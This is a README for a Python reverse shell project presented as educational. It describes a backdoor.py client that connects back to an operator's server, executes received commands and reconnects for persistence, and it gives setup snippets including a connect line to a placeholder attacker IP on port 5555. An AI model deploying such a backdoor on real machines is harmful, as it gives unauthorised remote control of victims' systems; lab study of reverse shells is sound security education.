# Python Reverse Shell (Educational Use Only)

## Overview

This project implements a basic reverse shell in Python using TCP sockets. It is designed for educational purposes to demonstrate concepts related to remote command execution, client-server architecture, and post-exploitation techniques in cybersecurity.

## Features

- Reverse shell connection from client to server
- Remote command execution capability
- JSON-based communication for reliability
- Simple TCP socket implementation
- Reconnection loop for basic persistence

## File Structure

- `backdoor.py`: Client script that connects to the server and executes received commands
- `server.py`: Server-side controller that listens for incoming connections and sends commands

## Usage

### 1. Setup the Server

Edit `server.py` to include your IP address:

```python
sock.bind(('YOUR_IP_ADDRESS', 5555))
```

Then run the server:

```bash
python server.py
```

### 2. Setup the Client

Edit `backdoor.py` to point to your server IP:

```python
s.connect(('YOUR_IP_ADDRESS', 5555))
```

Then run the client:

```bash
python backdoor.py
```

### 3. Interaction

Once the client connects to the server, the operator can issue shell commands remotely. Type `quit` to terminate the session.

## Test Environment Recommendation

- Use two virtual machines in an isolated environment (e.g., VirtualBox)
- Ensure both machines are on the same internal or host-only network
- The client should be run from the target machine, and the server from the attacker's machine

## Educational Objectives

- Learn the fundamentals of reverse shells
- Understand socket programming in Python
- Explore basic post-exploitation techniques in a controlled environment

## Requirements

- Python 3.x
- Basic knowledge of networking and cybersecurity



